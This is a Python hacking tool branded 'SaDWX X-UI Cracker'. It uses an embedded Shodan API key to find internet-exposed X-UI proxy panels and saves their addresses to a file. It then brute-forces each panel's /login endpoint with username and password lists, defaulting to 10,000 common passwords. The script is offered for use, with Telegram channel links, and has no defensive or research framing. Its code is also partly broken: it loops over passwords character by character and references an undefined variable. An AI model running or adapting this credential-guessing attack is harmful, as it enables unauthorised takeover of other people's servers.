import shodan,requests,platform,re,os,random,time
from colorama import Fore
try:

    def clear():
        if platform.system() == 'Windows':
            os.system('cls')
        elif platform.system()== 'Linux' or platform.system()== 'Debian':
            os.system('clear')
        else:
            pass
    err = "\033[1;31m [\033[1;33m-\033[1;31m]"
    good = "\033[1;32m [\033[1;36m+\033[1;32m]"
    def main(): #Get data from shodan(query is XUI)
        Hello_ips , data_list = [] , []
        count_error , count_True = 0 , 0
        api = shodan.Shodan("FBCWUSFYaT6Jo6eQAzkzVK5PKvkbQeDh")
        try:
            result = api.search("xui")
            for device in result['matches']:
                if 'HTTP/1.1 200 OK' in device['data']:
                    data = {
                        'port': device['port'],
                        'ip': device['ip_str'],
                    }
                    data_list.append(data)
                    ips = f"{data['ip']}:{data['port']}".replace("'",'')
                    Hello_ips.append(ips)
                    count_True += 1
                    print(f"""\r{Fore.YELLOW} 403-Error:{Fore.RED} {count_error}  {Fore.GREEN}SAD{Fore.RED}WX  {Fore.BLUE} Founds:{Fore.MAGENTA} {count_True} """,end='',flush=False)
                    time.sleep(.01)
                    if count_True == 50:
                        break
                else:
                    count_error +=1
                    print(f"""\r{Fore.YELLOW} 403-Error:{Fore.RED} {count_error}  {Fore.GREEN}SAD{Fore.RED}WX  {Fore.BLUE} Founds:{Fore.MAGENTA} {count_True} """,end='',flush=False)
                    time.sleep(.01)
            with open("XUI_SADWX_link.txt","a") as mf:
                mf.write(f"{Hello_ips}\n")
            print(f"\n{good} File With {Fore.MAGENTA}XUI_SaDWX_link {Fore.GREEN} name Saved!")
        except shodan.APIError as e:
            print(err+"Your internet is Fucking bad or off pls connect Vpn or proxy")
            time.sleep(5)
            main()
    
    word_input = ['#','$','>']
    input_word_random = random.choice(word_input)
    input_g = (Fore.GREEN+"""┌──("""+Fore.BLUE+"""SaDWX-XUI"""+Fore.GREEN+""")"""+Fore.BLUE+"-"+Fore.GREEN+"""["""+Fore.WHITE+"""/XUI"""+Fore.GREEN+"""]
└─"""+Fore.BLUE+f"""{input_word_random} """)
    input_r = (Fore.YELLOW+"""┌──("""+Fore.RED+"""SaDWX-XUI"""+Fore.YELLOW+""")"""+Fore.RED+"-"+Fore.YELLOW+"""["""+Fore.WHITE+"""/XUI"""+Fore.YELLOW+"""]
└─"""+Fore.RED+f"""{input_word_random} """)
    def exit_me():
        clear()
        print(good,"My Channel SADWX_TM_CH in telegran")
        exit()
    def cross():
        clear()
        print(f"""{Fore.BLUE}      X-UI Finder{Fore.GREEN}
         
         ▓▓▓▓
         ▓▓▓▓ 
         ▓▓▓▓
  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
         ▓▓▓▓
         ▓▓▓▓ {Fore.MAGENTA}1{Fore.BLUE}) {Fore.YELLOW}Start {Fore.GREEN}
         ▓▓▓▓ {Fore.MAGENTA}2{Fore.BLUE}) {Fore.YELLOW}programmer address for tell something {Fore.GREEN}
         ▓▓▓▓ {Fore.MAGENTA}3{Fore.BLUE}) {Fore.YELLOW}Our Channel(edu) and group(edu/fun) {Fore.GREEN}
         ▓▓▓▓ {Fore.MAGENTA}0{Fore.BLUE}) {Fore.YELLOW}Exit {Fore.GREEN}
         ▓▓▓▓ {Fore.MAGENTA}9{Fore.BLUE}) {Fore.YELLOW}Xui Cracker {Fore.GREEN}
         SaDWX:(""")
        aha = input(f'{input_g}')
        if aha=='1' or aha=='01':
            wrong_cross()
        elif aha=='2' or aha=='02':
            os.system('xdg-open https://t.me/ridam_dash')
            time.sleep(.5)
            os.system('xdg-open https://t.me/grixx')
            cross()
        elif aha=='3' or aha=='03':
            os.system('xdg-open https//t.me/SaDWX_TM_CH')
            time.sleep(.5)
            os.system('xdg-open https//t.me/SADWX_TM')
            cross()
        elif aha=='0' or aha=='00':
            exit_me()
        elif aha=='9' or aha=='99' or aha=='09':
            wrong_cross2()
        else:
            cross()
    def wrong_cross():
        clear()
        print(Fore.GREEN+"\r 1",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+"\r 1       2",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+"\r 2       3        4",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+f"\r   5     {Fore.YELLOW}6{Fore.GREEN}      7  ",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+f"\r    {Fore.YELLOW}6    {Fore.GREEN}5    {Fore.YELLOW}6    ",end="",flush=False)
        time.sleep(.5)
        print(Fore.YELLOW+"\r      6  6  6      ",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+"\r      ! ! !        ",end="",flush=False)
        time.sleep(.5)
        print(Fore.YELLOW+"\r       666         ",end="",flush=False)
        time.sleep(.5)
        print(Fore.RED+f"\r       D{Fore.YELLOW}66         ",end="",flush=False)
        time.sleep(.5)
        print(Fore.RED+f"\r       Di{Fore.YELLOW}6         ",end="",flush=False)
        time.sleep(.5)
        print(Fore.RED+"\r       Die         ",end="",flush=False)
        time.sleep(.5)
        print(Fore.RED+"\r       eiD        ",end="",flush=False)
        print(f"""{Fore.RED}
        ▓▓▓▓
        ▓▓▓▓
        ▓▓▓▓
        ▓▓▓▓     
        ▓▓D▓
        ▓▓▓▓
 ▓▓▓▓▓▓▓▓i▓▓▓▓▓▓▓▓▓ 
        ▓▓▓▓
        ▓▓e▓
        ▓▓▓▓ SaDWX:)""")
        main()
    
            
        
    
    def wrong_cross2():
        clear()
        print(Fore.GREEN+"\r 1",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+"\r 1       2",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+"\r 2       3        4",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+f"\r   5     {Fore.YELLOW}6{Fore.GREEN}      7  ",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+f"\r    {Fore.YELLOW}6    {Fore.GREEN}5    {Fore.YELLOW}6    ",end="",flush=False)
        time.sleep(.5)
        print(Fore.YELLOW+"\r      6  6  6      ",end="",flush=False)
        time.sleep(.5)
        print(Fore.GREEN+"\r      ! ! !        ",end="",flush=False)
        time.sleep(.5)
        print(Fore.YELLOW+"\r       666         ",end="",flush=False)
        time.sleep(.5)
        print(Fore.RED+f"\r       D{Fore.YELLOW}66         ",end="",flush=False)
        time.sleep(.5)
        print(Fore.RED+f"\r       Di{Fore.YELLOW}6         ",end="",flush=False)
        time.sleep(.5)
        print(Fore.RED+"\r       Die         ",end="",flush=False)
        time.sleep(.5)
        print(Fore.RED+"\r       eiD        ",end="",flush=False)
        print(f"""{Fore.RED}
        ▓▓▓▓
        ▓▓▓▓ 
        ▓▓▓▓
        ▓▓▓▓ {Fore.YELLOW} Enter ip/link {Fore.RED}
        ▓▓D▓
        ▓▓▓▓
 ▓▓▓▓▓▓▓▓i▓▓▓▓▓▓▓▓▓ 
        ▓▓▓▓
        ▓▓e▓
        ▓▓▓▓ SaDWX:)""")
        link_is_fuck = input(f'{input_r}')
        if link_is_fuck.startswith("http") or link_is_fuck.startswith("/"):
            clean_link = re.sub(r'http?://|/', '', link_is_fuck)
            htpp_s("http",clean_link)
        elif link_is_fuck.startswith("https") or link_is_fuck.startswith("/"):
            clean_link = re.sub(r'https?://|/', '', link_is_fuck)
            htpp_s("https",clean_link)
        else:
            print(err,'Pls enter link or ip ')
            time.sleep(2)
            wrong_cross2()
    def htpp_s(http_or_https,clean_ip_link):
        print(f"""{Fore.RED}
        ▓▓▓▓
        ▓▓▓▓ 
        ▓▓▓▓
        ▓▓▓▓ {Fore.YELLOW} Enter passlist or Enter to default{Fore.RED}
        ▓▓D▓ {Fore.YELLOW} Enter userlist or Enter to default{Fore.RED}
        ▓▓▓▓
 ▓▓▓▓▓▓▓▓i▓▓▓▓▓▓▓▓▓ 
        ▓▓▓▓
        ▓▓e▓
        ▓▓▓▓ SaDWX:)""")
        file_patch = input(f'{input_r}')
        file_patch_user = input(f'{input_r}')
        if os.path.isfile(file_patch) and os.path.isfile(file_patch_user):
            password_check =  open(file_patch).read()
            user_check = open(file_patch_user)
            for _line_ in user_check:
                for line in password_check:
                    url , payload , headers = f"{http_or_https}://{clean_ip_link}/login" , f"username={_line_}&password={line}" , {'Content-Type': 'application/x-www-form-urlencoded'}
                    response = requests.request("POST", url, headers=headers, data=payload)
                    if response.json()['success'] == False:
                        pass
                    elif response.json()['success'] == True:
                        print(good+f'found : link {url} > {username_check} > {password_check}')
                        break
                    else:
                        print(err+"somthing went wrong (check net)")
                        time.sleep(2)
                        wrong_cross2()
        else:
            print(good,'Use default passlist')
            time.sleep(5)
            password_check =  open("10k_common_pass.txt").read()
            user_check = open("user_list_common.txt")
            count_line = 0
            for _line_ in user_check:
                for line in password_check:
                    count_line +=1
                    url , payload , headers = f"{http_or_https}://{clean_ip_link}/login" , f"username={_line_}&password={line}" , {'Content-Type': 'application/x-www-form-urlencoded'}
                    response = requests.request("POST", url, headers=headers, data=payload)
                    if response.json()['success'] == False or response.json()['success'] == "false":
                        print(err+f"Not found {count_line}")
                    elif response.json()['success'] == True or response.json()['success'] == "true":
                        print(good+f'found : link {url} > {_line_} > {line}')
                        break
                    else:
                        print(err+"somthing went wrong (check net)")
                        time.sleep(2)
                        wrong_cross2()
    if __name__ == '__main__':
        cross()
except KeyboardInterrupt as e:
    clear()
    print(e)
    print(good,"My Channel SADWX_TM_CH in telegran")
except EOFError as e:
    clear()
    print(e)
    print(good,"My Channel SADWX_TM_CH in telegran")
except Exception as e:
    clear()
    print(e)
    print(good,"My Channel SADWX_TM_CH in telegran")
